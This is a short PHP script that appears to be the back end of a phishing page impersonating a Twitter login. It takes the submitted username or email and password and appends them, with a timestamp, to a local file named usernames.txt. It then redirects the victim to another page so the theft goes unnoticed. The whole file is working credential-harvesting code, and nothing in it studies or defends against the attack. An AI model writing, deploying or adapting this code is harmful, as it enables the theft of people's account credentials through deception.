<?php
$date = date('Y-m-d H:i:s');
file_put_contents("usernames.txt", "$date Twitter Username: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: new.html');
exit();
?>
